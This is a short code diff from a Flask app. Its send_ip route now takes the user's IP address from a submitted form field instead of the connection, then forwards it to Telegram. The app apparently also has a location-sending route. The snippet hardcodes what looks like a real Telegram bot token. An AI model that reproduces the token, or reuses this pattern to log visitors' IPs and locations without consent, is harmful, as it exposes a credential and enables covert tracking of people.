@@ -26,7 +26,7 @@ def send_location():
 @app.route('/send_ip', methods=['POST'])
 def send_ip():
     # Get the IP address of the user
-    ip_address = request.remote_addr
+    ip_address = request.form['ip_address']
     
     # Send the IP address to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
